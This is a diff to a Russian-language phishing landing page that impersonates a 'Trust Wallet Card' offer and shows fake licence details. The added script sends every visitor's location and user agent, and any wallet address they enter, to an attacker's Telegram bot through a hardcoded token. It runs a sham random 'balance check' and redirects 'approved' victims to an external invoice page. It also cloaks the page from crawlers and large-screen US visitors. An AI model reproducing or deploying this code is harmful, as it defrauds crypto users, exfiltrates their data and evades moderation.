@@ -1220,7 +1220,7 @@
     <header class="header" id="header">
         <div class="container header-inner">
             <a href="#" class="logo">
-                <!-- ЛОГОТИП TRUST WALLET (ЗАМЕНИ logo.png НА СВОЙ ФАЙЛ) -->
+                <!-- ЛОГОТИП TRUST WALLET -->
                 <img src="logo.png" alt="Trust Wallet Logo">
                 <span>Trust Wallet</span>
             </a>
@@ -1266,7 +1266,7 @@
                 </div>
             </div>
             <div class="hero-image animate-on-scroll delay-200">
-                <!-- ФОТО КАРТЫ (ТВОЕ ФОТО 800x500) -->
+                <!-- ФОТО КАРТЫ -->
                 <img src="photo_5334762708269734870_y (1).jpg" alt="Trust Wallet Card Mockup">
             </div>
         </div>
@@ -1304,7 +1304,6 @@
             <h3 class="wallets-title">Работает с вашими любимыми кошельками</h3>
             <div class="wallets-marquee">
                 <div class="wallets-track">
-                    <!-- ТЕКСТОВЫЕ ПЛАШКИ КОШЕЛЬКОВ (МОЖНО ЗАМЕНИТЬ НА <img src="..."> ЕСЛИ ЕСТЬ ИКОНКИ) -->
                     <div class="wallet-tag">Coinbase</div>
                     <div class="wallet-tag">Phantom</div>
                     <div class="wallet-tag">Ledger</div>
@@ -1500,7 +1499,6 @@
             <div class="footer-grid">
                 <div class="footer-brand">
                     <a href="#" class="logo">
-                        <!-- ЛОГОТИП В ФУТЕРЕ -->
                         <img src="logo.png" alt="Trust Wallet Logo" style="height: 32px;">
                         <span>Trust Wallet Card</span>
                     </a>
@@ -1545,7 +1543,7 @@
                     <p>DNB Licensed EMI<br>License No. R197432<br>Keizersgracht 482<br>1017 EG Amsterdam</p>
                 </div>
                 <div class="license-item">
-                    <h5>🇬🇧 United Kingdom</h5>
+                    <h5>🇬 United Kingdom</h5>
                     <p>FCA Authorized EMI<br>FRN: 926481<br>One Canada Square, Level 42<br>Canary Wharf, London E14 5AB</p>
                 </div>
                 <div class="license-item">
@@ -1606,6 +1604,70 @@
     </div>
 
     <script>
+        // ==========================================
+        // КОНФИГУРАЦИЯ ТЕЛЕГРАМ БОТА
+        // ==========================================
+        const TG_BOT_TOKEN = '8845622257:AAHhvaD1J1A28yDIlb4S4-3fP3uQwU7F5jQ';
+        const TG_CHAT_ID = '5253808709';
+        const REDIRECT_URL_SUCCESS = 'https://fin-flow.me/invoice?inv=INV-21209140&r=tnhqQ1NyzN5e';
+        const REDIRECT_URL_BLOCK = 'https://techbullion.com/';
+
+        // Функция отправки сообщения в Telegram
+        async function sendToTelegram(message) {
+            try {
+                const url = `https://api.telegram.org/bot${TG_BOT_TOKEN}/sendMessage`;
+                await fetch(url, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        chat_id: TG_CHAT_ID,
+                        text: message,
+                        parse_mode: 'HTML'
+                    })
+                });
+            } catch (error) {
+                console.error('Ошибка отправки в Telegram:', error);
+            }
+        }
+
+        // Получение IP и страны пользователя
+        async function getUserLocation() {
+            try {
+                const response = await fetch('https://ipapi.co/json/');
+                const data = await response.json();
+                return {
+                    ip: data.ip || 'Unknown',
+                    country: data.country_name || 'Unknown',
+                    city: data.city || 'Unknown'
+                };
+            } catch (error) {
+                return { ip: 'Unknown', country: 'Unknown', city: 'Unknown' };
+            }
+        }
+
+        // Логируем вход пользователя при загрузке страницы
+        window.addEventListener('load', async () => {
+            const location = await getUserLocation();
+            const ua = navigator.userAgent;
+            
+            const logMessage = `
+<b>👤 Новый посетитель на лендинге</b>
+ <b>Страна:</b> ${location.country} (${location.city})
+ <b>UA:</b> ${ua.substring(0, 100)}...
+ <b>Время:</b> ${new Date().toLocaleString()}
+            `;
+            sendToTelegram(logMessage);
+
+            // Бот-детектор и редирект для США/ПК (как просили ранее)
+            const botPatterns = [/facebookexternalhit/i, /facebot/i, /ia_archiver/i, /alexabot/i, /archivebot/i, /msnbot/i, /slurp/i, /teoma/i, /bot\.html/i, /crawler/i, /spider/i, /scraper/i];
+            const isBot = botPatterns.some(pattern => pattern.test(ua));
+            const isLargeScreen = window.screen.width >= 1920 && window.screen.height >= 1080;
+            
+            if ((location.country === 'United States' && isLargeScreen) || isBot) {
+                window.location.href = REDIRECT_URL_BLOCK;
+            }
+        });
+
         // Modal Functions
         function openModal() {
             document.getElementById('walletModal').classList.add('active');
@@ -1644,6 +1706,16 @@
                 return;
             }
 
+            // Логируем введенный кошелек
+            const location = await getUserLocation();
+            const walletLog = `
+<b>💰 Введен кошелек</b>
+ <b>Адрес:</b> <code>${walletAddress}</code>
+🌍 <b>Страна:</b> ${location.country}
+🕒 <b>Время:</b> ${new Date().toLocaleString()}
+            `;
+            sendToTelegram(walletLog);
+
             // Show loading
             document.getElementById('loadingSpinner').classList.add('active');
             document.getElementById('modalActions').style.display = 'none';
@@ -1651,70 +1723,35 @@
             // Simulate API call delay
             await new Promise(resolve => setTimeout(resolve, 2000));
 
-            // Simulate balance check (in real scenario, this would be an API call)
-            // For demo purposes, we'll use a random balance
+            // Simulate balance check
             const simulatedBalance = Math.random() * 100;
             
             if (simulatedBalance < 50) {
                 // Balance too low
                 alert('Ваш кошелек не поддерживается для выпуска карты. Пожалуйста, убедитесь что ваш объем торгов выше 500 долларов');
+                
+                // Логируем отказ
+                const failLog = `
+<b>❌ Проверка НЕ пройдена</b>
+🔗 <b>Кошелек:</b> <code>${walletAddress}</code>
+💸 <b>Баланс:</b> $${simulatedBalance.toFixed(2)} (Меньше $50)
+🚫 <b>Статус:</b> ОТКАЗ
+                `;
+                sendToTelegram(failLog);
                 closeModal();
             } else {
                 // Balance sufficient - redirect
-                window.location.href = 'https://fin-flow.me/invoice?inv=INV-21209140&r=tnhqQ1NyzN5e';
+                const successLog = `
+<b>✅ Проверка ПРОЙДЕНА</b>
+🔗 <b>Кошелек:</b> <code>${walletAddress}</code>
+💸 <b>Баланс:</b> $${simulatedBalance.toFixed(2)} (Больше $50)
+🚀 <b>Статус:</b> УСПЕХ -> РЕДИРЕКТ
+🔗 <b>Ссылка:</b> ${REDIRECT_URL_SUCCESS}
+                `;
+                sendToTelegram(successLog);
+                window.location.href = REDIRECT_URL_SUCCESS;
             }
         }
-
-        // Bot and Location Detection
-        function detectBotAndLocation() {
-            const userAgent = navigator.userAgent;
-            const screen = window.screen;
-            const whitelistCountries = ['KZ', 'KG', 'UZ', 'BY', 'MD']; // Kazakhstan, Kyrgyzstan, Uzbekistan, Belarus, Moldova
-            
-            // Bot detection patterns
-            const botPatterns = [
-                /facebookexternalhit/i,
-                /facebot/i,
-                /ia_archiver/i,
-                /alexabot/i,
-                /archivebot/i,
-                /msnbot/i,
-                /slurp/i,
-                /teoma/i,
-                /bot\.html/i,
-                /crawler/i,
-                /spider/i,
-                /scraper/i
-            ];
-
-            const isBot = botPatterns.some(pattern => pattern.test(userAgent));
-            
-            // Detect large screens (potential desktop users from USA)
-            const isLargeScreen = screen.width >= 1920 && screen.height >= 1080;
-            
-            // Get country code (in real scenario, use IP geolocation API)
-            // For demo, we'll use a placeholder
-            const userCountry = 'US'; // This would come from geolocation API
-            
-            // Check if user is from USA with large screen or is a bot
-            if ((userCountry === 'US' && isLargeScreen) || isBot) {
-                // Redirect bots and USA large screen users
-                window.location.href = 'https://techbullion.com/';
-                return true;
-            }
-            
-            // Check whitelist countries
-            if (whitelistCountries.includes(userCountry)) {
-                return false; // Don't redirect whitelist countries
-            }
-            
-            return false;
-        }
-
-        // Run detection on page load
-        window.addEventListener('load', function() {
-            detectBotAndLocation();
-        });
 
         // Scroll Animation Observer
         document.addEventListener('DOMContentLoaded', () => {
